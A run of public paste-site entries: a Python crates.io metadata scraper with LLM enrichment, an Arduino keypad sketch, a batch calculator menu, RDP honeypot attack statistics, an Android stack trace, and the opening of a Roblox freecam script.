            f""✅ Factual: [true statement about the crate]\n""
            f""❌ Counterfactual: [plausible but false statement]\n\n""
            f""Create 5 pairs.\n""
            f""<|end|>""
        )
        
        # Use higher temperature for creative outputs
        return run_llama(prompt, temp=0.6, max_tokens=400)
    except Exception as e:
        logging.warning(f""Factual pairs generation failed for {crate['name']}: {str(e)}"")
        return None

def extract_code_snippets(readme: str) -> list:
    """"""Extract code snippets from markdown README""""""
    snippets = []
    if not readme:
        return snippets
        
    # Find Rust code blocks
    pattern = r""```(?:rust|(?:no_run|ignore|compile_fail|mdbook-runnable)?)\s*([\s\S]*?)```""
    matches = re.findall(pattern, readme)
    
    for code in matches:
        if len(code.strip()) > 10:  # Only include non-trivial snippets
            snippets.append(code.strip())
    
    return snippets[:5]  # Limit to 5 snippets

def download_crate_source(crate_name: str, version: str, temp_dir: str) -> Optional[str]:
    """"""Download and extract crate source code""""""
    try:
        url = f""https://crates.io/api/v1/crates/{crate_name}/{version}/download""
        download_path = os.path.join(temp_dir, f""{crate_name}-{version}.tar.gz"")
        
        with session.get(url, stream=True) as r:
            r.raise_for_status()
            with open(download_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
        
        extract_path = os.path.join(temp_dir, f""{crate_name}-{version}"")
        os.makedirs(extract_path, exist_ok=True)
        
        with tarfile.open(download_path) as tar:
            tar.extractall(path=extract_path)
        
        return extract_path
    except Exception as e:
        logging.error(f""Failed to download source for {crate_name}: {str(e)}"")
        return None

def analyze_dependencies(crates_data: list) -> dict:
    """"""Analyze dependencies between crates""""""
    dependency_graph = {}
    crate_names = {crate[""name""] for crate in crates_data}
    
    for crate in crates_data:
        deps = []
        for dep in crate.get(""dependencies"", []):
            if dep.get(""crate_id"") in crate_names:
                deps.append(dep.get(""crate_id""))
        dependency_graph[crate[""name""]] = deps
    
    # Find most depended-upon crates
    reverse_deps = {}
    for crate, deps in dependency_graph.items():
        for dep in deps:
            if dep not in reverse_deps:
                reverse_deps[dep] = []
            reverse_deps[dep].append(crate)
    
    return {
        ""dependency_graph"": dependency_graph,
        ""reverse_dependencies"": reverse_deps,
        ""most_depended"": sorted(reverse_deps.items(), key=lambda x: len(x[1]), reverse=True)[:10]
    }

def save_checkpoint(data: list, filename_prefix: str = ""checkpoint"") -> str:
    """"""Save intermediary results with timestamp""""""
    timestamp = time.strftime(""%Y%m%d-%H%M%S"")
    filename = f""{filename_prefix}_{timestamp}.jsonl""
    with open(filename, ""w"") as out:
        for item in data:
            out.write(json.dumps(item) + ""\n"")
    logging.info(f""Saved checkpoint to {filename}"")
    return filename

@retry_with_backoff(max_retries=MAX_RETRIES)
def fetch_crate_metadata(crate: str) -> Optional[dict]:
    try:
        r = session.get(f""https://crates.io/api/v1/crates/{crate}"")
        r.raise_for_status()
        data = r.json()
        crate_data = data[""crate""]
        latest = crate_data[""newest_version""]
        
        # Get readme
        readme_response = session.get(f""https://crates.io/api/v1/crates/{crate}/readme"")
        readme = readme_response.text if readme_response.ok else """"
        
        # Get dependencies
        deps_response = session.get(f""https://crates.io/api/v1/crates/{crate}/{latest}/dependencies"")
        deps = deps_response.json().get(""dependencies"", []) if deps_response.ok else []
        
        # Get features - using the versions endpoint
        features = []
        versions_response = session.get(f""https://crates.io/api/v1/crates/{crate}/{latest}"")
        if versions_response.ok:
            version_data = versions_response.json().get(""version"", {})
            features_dict = version_data.get(""features"", {})
            features = [{""name"": k, ""dependencies"": v} for k, v in features_dict.items()]
        
        # Repository info and GitHub stars
        repo = crate_data.get(""repository"", """")
        gh_stars = 0
        
        # Check if it's a GitHub repo
        if ""github.com"" in repo and GITHUB_TOKEN:
            match = re.search(r""github.com/([^/]+)/([^/]+)"", repo)
            if match:
                owner, repo_name = match.groups()
                repo_name = repo_name.split('.')[0]  # Handle .git extensions
                gh_url = f""https://api.github.com/repos/{owner}/{repo_name}""
                gh_headers = {""Authorization"": f""token {GITHUB_TOKEN}""} if GITHUB_TOKEN else {}
                gh = session.get(gh_url, headers=gh_headers)
                if gh.ok:
                    gh_data = gh.json()
                    gh_stars = gh_data.get(""stargazers_count"", 0)
        
        # Check if it's hosted on lib.rs
        lib_rs_data = {}
        if ""lib.rs"" in repo:
            lib_rs_url = f""https://lib.rs/crates/{crate}""
            lib_rs_response = session.get(lib_rs_url)
            if lib_rs_response.ok:
                soup = BeautifulSoup(lib_rs_response.text, 'html.parser')
                # Get README from lib.rs if not already available
                if not readme:
                    readme_div = soup.find('div', class_='readme')
                    if readme_div:
                        readme = readme_div.get_text(strip=True)
                
                # Get lib.rs specific stats
                stats_div = soup.find('div', class_='crate-stats')
                if stats_div:
                    downloads_text = stats_div.find(string=re.compile(r'[\d,]+ downloads'))
                    if downloads_text:
                        lib_rs_data[""librs_downloads""] = int(re.sub(r'[^\d]', '', downloads_text))
        
        # Extract code snippets from readme
        code_snippets = extract_code_snippets(readme)
        
        # Extract sections from readme
        readme_sections = extract_readme_sections(readme) if readme else """"
        
        result = {
            ""name"": crate,
            ""version"": latest,
            ""description"": crate_data.get(""description"", """"),
            ""repository"": repo,
            ""keywords"": crate_data.get(""keywords"", []),
            ""categories"": crate_data.get(""categories"", []),
            ""readme"": readme,
            ""downloads"": crate_data.get(""downloads"", 0),
            ""github_stars"": gh_stars,
            ""dependencies"": deps,
            ""code_snippets"": code_snippets,
            ""features"": features,  # Now populated with actual features
            ""readme_sections"": readme_sections,  # New line added
            **lib_rs_data
        }
        
        return result
        
    except Exception as e:
        logging.error(f""Failed fetching metadata for {crate}: {str(e)}"")
        raise

def enrich_crate(crate: dict) -> dict:
    """"""Apply AI enrichments to crate data""""""
    try:
        # First generate a README summary to use in other prompts
        if crate[""readme""]:
            try:
                readme_content = crate.get(""readme_sections"", """") or truncate_content(crate.get(""readme"", """"), 2000)
                prompt = f""<|system|>Extract key features from README.\n<|user|>Summarize key aspects of this Rust crate from its README:\n{readme_content}\n<|end|>""
                crate[""readme_summary""] = run_llama(prompt, temp=0.3, max_tokens=300)
            except Exception as e:
                logging.warning(f""README summary failed for {crate['name']}: {str(e)}"")
                crate[""readme_summary""] = None
        
        # Extract key dependencies for context
        key_deps = [dep.get(""crate_id"") for dep in crate.get(""dependencies"", [])[:5] if dep.get(""kind"") == ""normal""]
        
        # Now use this enriched context for classification
        crate[""feature_summary""] = summarize_feature(crate[""name""], crate[""features""])
        crate[""use_case""] = classify_use_case(
            crate[""name""], 
            crate[""description""], 
            crate[""keywords""],
            crate.get(""readme_summary"", """"),
            key_deps
        )
        crate[""score""] = score_crate(crate)
        crate[""factual_counterfactual""] = factual_pairs(crate)
                
        return crate
    except Exception as e:
        logging.error(f""Failed to enrich {crate['name']}: {str(e)}"")
        return crate

def get_crate_list() -> list:
    return [
        # Original crates
        ""serde"", ""tokio"", ""reqwest"", ""rand"", ""clap"", ""rayon"", ""uuid"", ""actix-web"", ""sqlx"", ""candle-core"", ""onnxruntime"",
        
        # ML/AI crates
        ""tokenizers"", ""safetensors"", ""linfa"", ""ndarray"", ""smartcore"", ""burn"", ""tract"", ""tch"",
        # Add more crates here...
        
        # Other specialized crates
        ""movingai"", ""ug-metal"", ""surrealml-core"", ""tauri"",
        # Add more crates here...
    ]

def main():
    start_time = time.time()
    crates = get_crate_list()
    logging.info(f""Fetching and enriching {len(crates)} crates..."")

    # Create timestamped output directory
    timestamp = time.strftime(""%Y%m%d-%H%M%S"")
    output_dir = f""crate_data_{timestamp}""
    os.makedirs(output_dir, exist_ok=True)
    
    enriched = []
    
    # Step 1: Fetch metadata for all crates
    with ThreadPoolExecutor(max_workers=4) as pool:
        futures = {pool.submit(fetch_crate_metadata, name): name for name in crates}
        
        for i, future in enumerate(as_completed(futures)):
            crate_name = futures[future]
            try:
                data = future.result()
                if data:
                    enriched.append(data)
                    logging.info(f""Fetched metadata for {crate_name} ({i+1}/{len(crates)})"")
                    
                # Save checkpoint periodically
                if (i+1) % CHECKPOINT_INTERVAL == 0 or i+1 == len(crates):
                    save_checkpoint(enriched, f""{output_dir}/metadata_checkpoint"")
                    
            except Exception as e:
                logging.error(f""Failed processing {crate_name}: {str(e)}"")
    
    # Step 2: Enrich crates with AI insights
    for i, crate in enumerate(enriched):
        try:
            logging.info(f""Enriching {crate['name']} ({i+1}/{len(enriched)})"")
            enriched[i] = enrich_crate(crate)
            
            # Save checkpoint periodically
            if (i+1) % CHECKPOINT_INTERVAL == 0 or i+1 == len(enriched):
                save_checkpoint(enriched, f""{output_dir}/ai_enriched_checkpoint"")
                
        except Exception as e:
            logging.error(f""Failed to enrich {crate['name']}: {str(e)}"")
    
    # Step 3: Perform dependency analysis
    logging.info(""Analyzing crate dependencies..."")
    dependency_analysis = analyze_dependencies(enriched)
    
    # Save final results
    final_output = f""{output_dir}/enriched_crate_metadata_{timestamp}.jsonl""
    with open(final_output, ""w"") as out:
        for item in enriched:
            out.write(json.dumps(item) + ""\n"")
            
    # Save dependency analysis
    with open(f""{output_dir}/dependency_analysis_{timestamp}.json"", ""w"") as out:
        json.dump(dependency_analysis, out, indent=2)

    # Generate summary report
    summary = {
        ""total_crates"": len(enriched),
        ""total_time"": f""{time.time() - start_time:.2f}s"",
        ""timestamp"": datetime.now().isoformat(),
        ""most_popular"": sorted(enriched, key=lambda x: x.get(""score"", 0), reverse=True)[:5],
        ""most_depended_upon"": dependency_analysis[""most_depended""][:5]
    }
    
    with open(f""{output_dir}/summary_report_{timestamp}.json"", ""w"") as out:
        json.dump(summary, out, indent=2)

    logging.info(f""✅ Done. Enriched {len(enriched)} crates in {time.time() - start_time:.2f}s"")
    logging.info(f""Results saved to {output_dir}/"")

if __name__ == ""__main__"":
    # Check disk space before starting
    if shutil.disk_usage(""/"").free < 1_000_000_000:  # 1GB
        logging.warning(""Low disk space! This may affect performance."")
    
    try:
        main()
    except Exception as e:
        logging.critical(f""Script failed: {str(e)}"")
        sys.exit(1)
"
JimuZJEX,Grupo 3 | Projeto 5,Ultizin,C++,Tuesday 17th of June 2025 08:37:41 PM CDT,"#include <Keypad.h>

const byte qtdLinhas = 4;
const byte qtdColunas = 4;

char matriz_teclas[qtdLinhas][qtdColunas] = {
  {'1', '2', '3', 'A'},
  {'4', '5', '6', 'B'},
  {'7', '8', '9', 'C'},
  {'*', '0', '#', 'D'}
};

byte PinosqtdLinhas[qtdLinhas] = {9, 8, 7, 6};
byte PinosqtdColunas[qtdColunas] = {5, 4, 3, 2};

Keypad meuteclado = Keypad(makeKeymap(matriz_teclas), PinosqtdLinhas, PinosqtdColunas, qtdLinhas, qtdColunas);

void setup() {
  Serial.begin(9600);
  Serial.println(""Aperte uma tecla...\n"");
}

void loop() {
  char tecla_pressionada = meuteclado.getKey();
  if (tecla_pressionada) {
    Serial.print(""Tecla pressionada: "");
    Serial.println(tecla_pressionada);
  }
}
"
S4ytCyyu,menu.bat,DrAungWinHtut,Batch,Tuesday 17th of June 2025 08:33:09 PM CDT,":MENU
REM Main Menu
@echo off
ECHO 1. Calculate Area of Circle
ECHO 2. Calculate Area of Rectangle
ECHO 3. Exit
SET /P choice=Choose an option (1 or 2 or 3) : 
IF ""%choice%""==""1"" GOTO CIRCLE
IF ""%choice%""==""2"" GOTO RECTANGLE
IF ""%choice%""==""3"" GOTO EXIT


:CIRCLE
REM Area of Circle
@echo off
ECHO Area of Circle
SET /P radius=Enter the radius of the circle:
SET /A area=314*%radius%*%radius%/100
REM The formula for the area of a circle is πr², where π is approximated as 3.14
ECHO The area of the circle with radius %radius% is %area%.
REM End of Area of Circle
ECHO Press any key to continue...
PAUSE > NUL
CLS
GOTO MENU

:RECTANGLE
REM Area of Rectangle
@echo off
ECHO Area of Rectangle
SET /P length=Enter the length of the rectangle:
SET /P width=Enter the width of the rectangle:
SET /A area=%length%*%width%
ECHO The area of the rectangle with length %length% and width %width% is %area%.
REM End of Area of Rectangle
ECHO Press any key to continue...
PAUSE > NUL
CLS
GOTO MENU

:EXIT
REM Exit the script
@echo off
ECHO Exiting the program...
ECHO Goodbye!
EXIT /B
"
xhAYwvfK,2025-06-17_stats.json,rdp_snitch,JSON,Tuesday 17th of June 2025 07:18:12 PM CDT,"{
  ""ip"": {
    ""194.165.16.164"": 6,
    ""91.238.181.92"": 12,
    ""139.59.237.217"": 15,
    ""157.66.222.138"": 6,
    ""205.210.31.81"": 9,
    ""103.87.131.65"": 12,
    ""111.170.152.113"": 18,
    ""2.57.121.247"": 3,
    ""92.63.197.23"": 18,
    ""8.219.100.95"": 6,
    ""194.180.49.127"": 3,
    ""205.210.31.219"": 9,
    ""194.164.107.6"": 30,
    ""172.236.141.242"": 8322,
    ""24.173.30.170"": 12180,
    ""167.172.131.118"": 11346,
    ""185.196.220.41"": 9,
    ""205.210.31.180"": 9,
    ""146.190.167.180"": 3,
    ""152.32.139.96"": 3,
    ""194.165.16.161"": 6,
    ""147.185.132.66"": 9,
    ""162.142.125.204"": 3,
    ""167.94.145.110"": 3,
    ""14.225.202.191"": 198
  },
  ""asn"": {
    ""AS48721"": 12,
    ""AS49434"": 12,
    ""AS14061"": 11364,
    ""AS150895"": 6,
    ""AS396982"": 36,
    ""AS55947"": 12,
    ""AS151185"": 18,
    ""AS47890"": 3,
    ""AS210848"": 18,
    ""AS45102"": 6,
    ""AS201814"": 3,
    ""AS50219"": 30,
    ""AS63949"": 8322,
    ""AS11427"": 12180,
    ""AS213438"": 9,
    ""AS135377"": 3,
    ""AS398324"": 3,
    ""AS398705"": 3,
    ""AS135905"": 198
  },
  ""isp"": {
    ""Flyservers S.A."": 12,
    ""Datacenter location PAR1 France"": 12,
    ""DIGITALOCEAN"": 15,
    ""TANTHOIVPS"": 6,
    ""Google LLC"": 36,
    ""Bangalore Broadband Network Pvt Ltd"": 12,
    ""China Telecom"": 18,
    ""Unmanaged LTD"": 3,
    ""Telkom Internet LTD"": 18,
    ""Alibaba (US) Technology Co., Ltd."": 6,
    ""MEVSPACE sp. z o.o."": 3,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""Akamai Technologies, Inc."": 8322,
    ""Charter Communications Inc"": 12180,
    ""DigitalOcean, LLC"": 11349,
    ""ColocaTel Inc."": 9,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 6,
    ""Vietnam Posts and Telecommunications Group"": 198
  },
  ""org"": {
    ""Flyservers S.A"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""DigitalOcean, LLC"": 11364,
    ""Tan VPS Company Limited"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Unknown"": 12,
    ""Chinanet HB"": 18,
    ""Unmanaged LTD"": 3,
    ""Korotkij Denis Aleksandrovich"": 18,
    ""Alibaba.com Singapore E-Commerce Private Limited"": 6,
    ""HostSlick"": 3,
    ""Valence Technology Co"": 30,
    ""Akamai Technologies, Inc."": 8322,
    ""Spectrum"": 12180,
    ""Colocatel Inc"": 9,
    ""Ucloud Information Technology"": 3,
    ""Censys Inc"": 3,
    ""Censys, Inc."": 3,
    ""VNPT"": 198
  },
  ""regionName"": {
    ""Kaunas"": 12,
    ""\u00cele-de-France"": 12,
    ""South West"": 15,
    ""B\u00ecnh \u0110\u1ecbnh Province"": 6,
    ""California"": 39,
    ""Karnataka"": 12,
    ""Hubei"": 18,
    ""England"": 3,
    ""North Holland"": 18,
    ""North West"": 36,
    ""Bavaria"": 3,
    ""South East"": 8322,
    ""Texas"": 12180,
    ""New Jersey"": 11346,
    ""Virginia"": 9,
    ""Seoul"": 3,
    ""Michigan"": 6,
    ""Hanoi"": 198
  },
  ""country"": {
    ""Lithuania"": 12,
    ""France"": 12,
    ""Singapore"": 8373,
    ""Vietnam"": 204,
    ""United States"": 23580,
    ""India"": 12,
    ""China"": 18,
    ""United Kingdom"": 3,
    ""The Netherlands"": 18,
    ""Germany"": 3,
    ""South Korea"": 3
  },
  ""account"": {
    ""Test"": 24,
    ""hello"": 32109,
    ""fDwfFzZZx"": 3,
    ""lUMKht"": 3,
    ""lSAFNq"": 3,
    ""Administr"": 21,
    ""XeGiVCxed"": 3,
    ""QyyevX"": 3,
    ""PopGKw"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""Domain"": 9,
    ""NdFQdXeUP"": 3,
    ""wyysfn"": 3,
    ""DVPYnV"": 3,
    ""Administrator"": 3,
    ""oJbOmaFae"": 3,
    ""CzQalH"": 3,
    ""rkdbQY"": 3,
    ""(empty)"": 6
  },
  ""keyboard"": {
    ""Unknown"": 32238
  },
  ""client_build"": {
    ""Unknown"": 32238
  },
  ""client_name"": {
    ""Unknown"": 32238
  },
  ""ip_type"": {
    ""Unknown"": 12495,
    ""hosting"": 19743
  }
}"
PzBuqVzn,2025-06-17_stats.json,rdp_snitch,JSON,Tuesday 17th of June 2025 07:16:21 PM CDT,"{
  ""ip"": {
    ""194.165.16.164"": 4,
    ""91.238.181.92"": 8,
    ""139.59.237.217"": 10,
    ""157.66.222.138"": 4,
    ""205.210.31.81"": 6,
    ""103.87.131.65"": 8,
    ""111.170.152.113"": 12,
    ""2.57.121.247"": 2,
    ""92.63.197.23"": 12,
    ""8.219.100.95"": 4,
    ""194.180.49.127"": 2,
    ""205.210.31.219"": 6,
    ""194.164.107.6"": 20,
    ""172.236.141.242"": 5548,
    ""24.173.30.170"": 8120,
    ""167.172.131.118"": 7564,
    ""185.196.220.41"": 6,
    ""205.210.31.180"": 6,
    ""146.190.167.180"": 2,
    ""152.32.139.96"": 2,
    ""194.165.16.161"": 4,
    ""147.185.132.66"": 6,
    ""162.142.125.204"": 2,
    ""167.94.145.110"": 2,
    ""14.225.202.191"": 132
  },
  ""asn"": {
    ""AS48721"": 8,
    ""AS49434"": 8,
    ""AS14061"": 7576,
    ""AS150895"": 4,
    ""AS396982"": 24,
    ""AS55947"": 8,
    ""AS151185"": 12,
    ""AS47890"": 2,
    ""AS210848"": 12,
    ""AS45102"": 4,
    ""AS201814"": 2,
    ""AS50219"": 20,
    ""AS63949"": 5548,
    ""AS11427"": 8120,
    ""AS213438"": 6,
    ""AS135377"": 2,
    ""AS398324"": 2,
    ""AS398705"": 2,
    ""AS135905"": 132
  },
  ""isp"": {
    ""Flyservers S.A."": 8,
    ""Datacenter location PAR1 France"": 8,
    ""DIGITALOCEAN"": 10,
    ""TANTHOIVPS"": 4,
    ""Google LLC"": 24,
    ""Bangalore Broadband Network Pvt Ltd"": 8,
    ""China Telecom"": 12,
    ""Unmanaged LTD"": 2,
    ""Telkom Internet LTD"": 12,
    ""Alibaba (US) Technology Co., Ltd."": 4,
    ""MEVSPACE sp. z o.o."": 2,
    ""LNK SYSTEMS MUNTENIA SRL"": 20,
    ""Akamai Technologies, Inc."": 5548,
    ""Charter Communications Inc"": 8120,
    ""DigitalOcean, LLC"": 7566,
    ""ColocaTel Inc."": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Censys, Inc."": 4,
    ""Vietnam Posts and Telecommunications Group"": 132
  },
  ""org"": {
    ""Flyservers S.A"": 8,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""DigitalOcean, LLC"": 7576,
    ""Tan VPS Company Limited"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Unknown"": 8,
    ""Chinanet HB"": 12,
    ""Unmanaged LTD"": 2,
    ""Korotkij Denis Aleksandrovich"": 12,
    ""Alibaba.com Singapore E-Commerce Private Limited"": 4,
    ""HostSlick"": 2,
    ""Valence Technology Co"": 20,
    ""Akamai Technologies, Inc."": 5548,
    ""Spectrum"": 8120,
    ""Colocatel Inc"": 6,
    ""Ucloud Information Technology"": 2,
    ""Censys Inc"": 2,
    ""Censys, Inc."": 2,
    ""VNPT"": 132
  },
  ""regionName"": {
    ""Kaunas"": 8,
    ""\u00cele-de-France"": 8,
    ""South West"": 10,
    ""B\u00ecnh \u0110\u1ecbnh Province"": 4,
    ""California"": 26,
    ""Karnataka"": 8,
    ""Hubei"": 12,
    ""England"": 2,
    ""North Holland"": 12,
    ""North West"": 24,
    ""Bavaria"": 2,
    ""South East"": 5548,
    ""Texas"": 8120,
    ""New Jersey"": 7564,
    ""Virginia"": 6,
    ""Seoul"": 2,
    ""Michigan"": 4,
    ""Hanoi"": 132
  },
  ""country"": {
    ""Lithuania"": 8,
    ""France"": 8,
    ""Singapore"": 5582,
    ""Vietnam"": 136,
    ""United States"": 15720,
    ""India"": 8,
    ""China"": 12,
    ""United Kingdom"": 2,
    ""The Netherlands"": 12,
    ""Germany"": 2,
    ""South Korea"": 2
  },
  ""account"": {
    ""Test"": 16,
    ""hello"": 21406,
    ""fDwfFzZZx"": 2,
    ""lUMKht"": 2,
    ""lSAFNq"": 2,
    ""Administr"": 14,
    ""XeGiVCxed"": 2,
    ""QyyevX"": 2,
    ""PopGKw"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""Domain"": 6,
    ""NdFQdXeUP"": 2,
    ""wyysfn"": 2,
    ""DVPYnV"": 2,
    ""Administrator"": 2,
    ""oJbOmaFae"": 2,
    ""CzQalH"": 2,
    ""rkdbQY"": 2,
    ""(empty)"": 4
  },
  ""keyboard"": {
    ""Unknown"": 21492
  },
  ""client_build"": {
    ""Unknown"": 21492
  },
  ""client_name"": {
    ""Unknown"": 21492
  },
  ""ip_type"": {
    ""Unknown"": 8330,
    ""hosting"": 13162
  }
}"
GrTmjdr8,2025-06-17_stats.json,rdp_snitch,JSON,Tuesday 17th of June 2025 07:15:11 PM CDT,"{
  ""ip"": {
    ""194.165.16.164"": 2,
    ""91.238.181.92"": 4,
    ""139.59.237.217"": 5,
    ""157.66.222.138"": 2,
    ""205.210.31.81"": 3,
    ""103.87.131.65"": 4,
    ""111.170.152.113"": 6,
    ""2.57.121.247"": 1,
    ""92.63.197.23"": 6,
    ""8.219.100.95"": 2,
    ""194.180.49.127"": 1,
    ""205.210.31.219"": 3,
    ""194.164.107.6"": 10,
    ""172.236.141.242"": 2774,
    ""24.173.30.170"": 4060,
    ""167.172.131.118"": 3782,
    ""185.196.220.41"": 3,
    ""205.210.31.180"": 3,
    ""146.190.167.180"": 1,
    ""152.32.139.96"": 1,
    ""194.165.16.161"": 2,
    ""147.185.132.66"": 3,
    ""162.142.125.204"": 1,
    ""167.94.145.110"": 1,
    ""14.225.202.191"": 66
  },
  ""asn"": {
    ""AS48721"": 4,
    ""AS49434"": 4,
    ""AS14061"": 3788,
    ""AS150895"": 2,
    ""AS396982"": 12,
    ""AS55947"": 4,
    ""AS151185"": 6,
    ""AS47890"": 1,
    ""AS210848"": 6,
    ""AS45102"": 2,
    ""AS201814"": 1,
    ""AS50219"": 10,
    ""AS63949"": 2774,
    ""AS11427"": 4060,
    ""AS213438"": 3,
    ""AS135377"": 1,
    ""AS398324"": 1,
    ""AS398705"": 1,
    ""AS135905"": 66
  },
  ""isp"": {
    ""Flyservers S.A."": 4,
    ""Datacenter location PAR1 France"": 4,
    ""DIGITALOCEAN"": 5,
    ""TANTHOIVPS"": 2,
    ""Google LLC"": 12,
    ""Bangalore Broadband Network Pvt Ltd"": 4,
    ""China Telecom"": 6,
    ""Unmanaged LTD"": 1,
    ""Telkom Internet LTD"": 6,
    ""Alibaba (US) Technology Co., Ltd."": 2,
    ""MEVSPACE sp. z o.o."": 1,
    ""LNK SYSTEMS MUNTENIA SRL"": 10,
    ""Akamai Technologies, Inc."": 2774,
    ""Charter Communications Inc"": 4060,
    ""DigitalOcean, LLC"": 3783,
    ""ColocaTel Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Censys, Inc."": 2,
    ""Vietnam Posts and Telecommunications Group"": 66
  },
  ""org"": {
    ""Flyservers S.A"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""DigitalOcean, LLC"": 3788,
    ""Tan VPS Company Limited"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Unknown"": 4,
    ""Chinanet HB"": 6,
    ""Unmanaged LTD"": 1,
    ""Korotkij Denis Aleksandrovich"": 6,
    ""Alibaba.com Singapore E-Commerce Private Limited"": 2,
    ""HostSlick"": 1,
    ""Valence Technology Co"": 10,
    ""Akamai Technologies, Inc."": 2774,
    ""Spectrum"": 4060,
    ""Colocatel Inc"": 3,
    ""Ucloud Information Technology"": 1,
    ""Censys Inc"": 1,
    ""Censys, Inc."": 1,
    ""VNPT"": 66
  },
  ""regionName"": {
    ""Kaunas"": 4,
    ""\u00cele-de-France"": 4,
    ""South West"": 5,
    ""B\u00ecnh \u0110\u1ecbnh Province"": 2,
    ""California"": 13,
    ""Karnataka"": 4,
    ""Hubei"": 6,
    ""England"": 1,
    ""North Holland"": 6,
    ""North West"": 12,
    ""Bavaria"": 1,
    ""South East"": 2774,
    ""Texas"": 4060,
    ""New Jersey"": 3782,
    ""Virginia"": 3,
    ""Seoul"": 1,
    ""Michigan"": 2,
    ""Hanoi"": 66
  },
  ""country"": {
    ""Lithuania"": 4,
    ""France"": 4,
    ""Singapore"": 2791,
    ""Vietnam"": 68,
    ""United States"": 7860,
    ""India"": 4,
    ""China"": 6,
    ""United Kingdom"": 1,
    ""The Netherlands"": 6,
    ""Germany"": 1,
    ""South Korea"": 1
  },
  ""account"": {
    ""Test"": 8,
    ""hello"": 10703,
    ""fDwfFzZZx"": 1,
    ""lUMKht"": 1,
    ""lSAFNq"": 1,
    ""Administr"": 7,
    ""XeGiVCxed"": 1,
    ""QyyevX"": 1,
    ""PopGKw"": 1,
    ""eltons"": 5,
    ""administr"": 5,
    ""Domain"": 3,
    ""NdFQdXeUP"": 1,
    ""wyysfn"": 1,
    ""DVPYnV"": 1,
    ""Administrator"": 1,
    ""oJbOmaFae"": 1,
    ""CzQalH"": 1,
    ""rkdbQY"": 1,
    ""(empty)"": 2
  },
  ""keyboard"": {
    ""Unknown"": 10746
  },
  ""client_build"": {
    ""Unknown"": 10746
  },
  ""client_name"": {
    ""Unknown"": 10746
  },
  ""ip_type"": {
    ""Unknown"": 4165,
    ""hosting"": 6581
  }
}"
9x5UbgSv,2025-06-18T01:58:56.574,powerampache,PHP,Tuesday 17th of June 2025 05:58:59 PM CDT,"1.00-72-BETA (74) - DB: 83
retrofit2.HttpException: HTTP 404 Not Found
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

"
8Zw6vEjs,Roblox Freecam script,Steamhesaproblox,RBScript,Tuesday 17th of June 2025 05:29:27 PM CDT,"--!nonstrict
------------------------------------------------------------------------
-- Freecam
-- Cinematic free camera for spectating and video production.
------------------------------------------------------------------------

local pi    = math.pi
local abs   = math.abs
local clamp = math.clamp
local exp   = math.exp
local rad   = math.rad
local sign  = math.sign
local sqrt  = math.sqrt
local tan   = math.tan

local ContextActionService = game:GetService(""ContextActionService"")
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local StarterGui = game:GetService(""StarterGui"")
local UserInputService = game:GetService(""UserInputService"")
local Workspace = game:GetService(""Workspace"")
local Settings = UserSettings()
local GameSettings = Settings.GameSettings

local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
	Players:GetPropertyChangedSignal(""LocalPlayer""):Wait()
	LocalPlayer = Players.LocalPlayer
end

local Camera = Workspace.CurrentCamera
Workspace:GetPropertyChangedSignal(""CurrentCamera""):Connect(function()
	local newCamera = Workspace.CurrentCamera
	if newCamera then
		Camera = newCamera
	end
end)

local FFlagUserExitFreecamBreaksWithShiftlock
do
    local success, result = pcall(function()
        return UserSettings():IsUserFeatureEnabled(""UserExitFreecamBreaksWithShiftlock"")
    end)
    FFlagUserExitFreecamBreaksWithShiftlock = success and result
end

local FFlagUserShowGuiHideToggles
do
    local success, result = pcall(function()
        return UserSettings():IsUserFeatureEnabled(""UserShowGuiHideToggles"")
    end)
    FFlagUserShowGuiHideToggles = success and result
end

------------------------------------------------------------------------

local FREECAM_ENABLED_ATTRIBUTE_NAME = ""FreecamEnabled""
local TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value

local NAV_GAIN = Vector3.new(1, 1, 1)*64
local PAN_GAIN = Vector2.new(0.75, 1)*8
local FOV_GAIN = 300

local PITCH_LIMIT = rad(90)

local VEL_STIFFNESS = 1.5
local PAN_STIFFNESS = 1.0
local FOV_STIFFNESS = 4.0

------------------------------------------------------------------------

local Spring = {} do
	Spring.__index = Spring

	function Spring.new(freq, pos)
		local self = setmetatable({}, Spring)
		self.f = freq
		self.p = pos
		self.v = pos*0
		return self
	end

	function Spring:Update(dt, goal)
		local f = self.f*2*pi
		local p0 = self.p
		local v0 = self.v

		local offset = goal - p0
		local decay = exp(-f*dt)

		local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
		local v1 = (f*dt*(offset*f - v0) + v0)*decay

		self.p = p1
		self.v = v1

		return p1
	end

	function Spring:Reset(pos)
		self.p = pos
		self.v = pos*0
	end
end

------------------------------------------------------------------------

local cameraPos = Vector3.new()
local cameraRot = Vector2.new()
local cameraFov = 0

local velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
local panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
local fovSpring = Spring.new(FOV_STIFFNESS, 0)

------------------------------------------------------------------------

local Input = {} do
	local thumbstickCurve do
		local K_CURVATURE = 2.0
		local K_DEADZONE = 0.15

		local function fCurve(x)
